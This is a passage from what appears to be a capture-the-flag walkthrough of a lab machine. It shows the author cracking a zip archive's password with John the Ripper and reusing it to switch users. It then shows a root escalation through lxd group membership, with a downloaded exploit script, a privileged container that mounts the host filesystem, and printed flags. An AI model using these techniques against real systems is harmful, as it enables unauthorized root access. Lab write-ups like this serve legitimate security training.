[data.zip] var/www/html/favicon.ico password:
```

We can use john 

```bash
❯ zip2john data.zip > hashh
data.zip/var/www/html/assets/ is not encrypted!
ver 1.0 data.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 data.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2
ver 1.0 data.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 data.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6
ver 1.0 efh 5455 efh 7875 data.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F
ver 2.0 efh 5455 efh 7875 data.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E
ver 2.0 efh 5455 efh 7875 data.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

```bash
❯ /usr/bin/cat hashh
data.zip:$pkzip2$3*2*1*0*0*24*02f9*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*285c*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5c67*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip2$::data.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:data.zip
```

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (data.zip)
1g 0:00:00:04 DONE (2023-01-11 14:27) 0.2109g/s 2185Kp/s 2185Kc/s 2185KC/s adnc153..adilizinha
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We have the password

```bash
admin@it
```

We unzip and works

```bash
❯ unzip data.zip
Archive:  data.zip
[data.zip] var/www/html/favicon.ico password: 
  inflating: var/www/html/favicon.ico  
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt
```

But the files are not interesting, we can try to use the password for the user ash

```bash
tomcat@tabby:/var/www/html/files$ su ash
Password: admin@it
ash@tabby:/var/www/html/files$ whoami
ash
ash@tabby:/var/www/html/files$
```

We can read the user flag

```bash
ash@tabby:~$ cat user.txt 
fca0a19be2201efee510a62aee43eb6f
```

Now we have to be root, we can abuse of the pkexec but I won't do that
```bash
ash@tabby:/$ find -perm -4000 2>/dev/null | grep -v snap
./usr/bin/pkexec
./usr/bin/mount
./usr/bin/at
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/su
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/umount
./usr/bin/gpasswd
./usr/bin/fusermount
./usr/bin/sudo
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

ash is in the lxd group we can use that

```bash
ash@tabby:/$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

```bash
❯ searchsploit lxd
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Ubuntu 18.04 - 'lxd' Privilege Escalation                                                     | linux/local/46978.sh
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We trasfer the exploit to our attack machine

```bash
❯ searchsploit -m linux/local/46978.sh
  Exploit: Ubuntu 18.04 - 'lxd' Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46978
     Path: /usr/share/exploitdb/exploits/linux/local/46978.sh
File Type: Bourne-Again shell script, UTF-8 Unicode text executable
```

```bash
❯ mv 46978.sh lxd.sh
```

We follow the instructions of the script

```bash
❯ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
--2023-01-11 17:22:58--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 8060 (7.9K) [text/plain]
Grabando a: «build-alpine»

build-alpine                    100%[=======================================================>]   7.87K  --.-KB/s    en 0.009s  

2023-01-11 17:22:58 (895 KB/s) - «build-alpine» guardado [8060/8060]
```

Run this and you will have a tar.gz
```bash
❯ bash build-alpine
```

We modify the script only remove lxd init --auto

This function must be like this

```bash
function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" 
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
  cleanup
}
```

We transfer to the machine

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
ash@tabby:/tmp$ wget http://10.10.14.21/lxd.sh
--2023-01-11 23:30:12--  http://10.10.14.21/lxd.sh
Connecting to 10.10.14.21:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1435 (1.4K) [text/x-sh]
Saving to: ‘lxd.sh’

lxd.sh              100%[===================>]   1.40K  --.-KB/s    in 0.03s   

2023-01-11 23:30:12 (54.9 KB/s) - ‘lxd.sh’ saved [1435/1435]
```

After transfer the .tar.gz

```bash
ash@tabby:/tmp$ chmod +x lxd.sh 
ash@tabby:/tmp$ ./lxd.sh 

Usage:
	[-f] Filename (.tar.gz alpine file)
	[-h] Show this help panel

ash@tabby:/tmp$ 
```

Export your PATH to the machine because the machine don't have lxd

```bash
ash@tabby:/tmp$ which lxd
ash@tabby:/tmp$
```

```bash
export PATH=you path
```

After that your see the lxd

```bash
ash@tabby:/tmp$ which lxd
/snap/bin/lxd
```

move the files to /dev/shm if you have problems

```bash
ash@tabby:/dev/shm$ ./lxd.sh -f alpine-v3.17-x86_64-20230111_1724.tar.gz 
Image imported with fingerprint: 6ddc6ba8b5f82b7a72ff387644f2fcaff8d4ab533efea4bb0b7c1bae6b8fd349
[*] Listing images...

Creating privesc
Device giveMeRoot added to privesc         
~ # whoami
root
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt  snap
/mnt/root/root # cat root.txt 
29381d687601d67a1afc2325ac482704
/mnt/root/root #
```


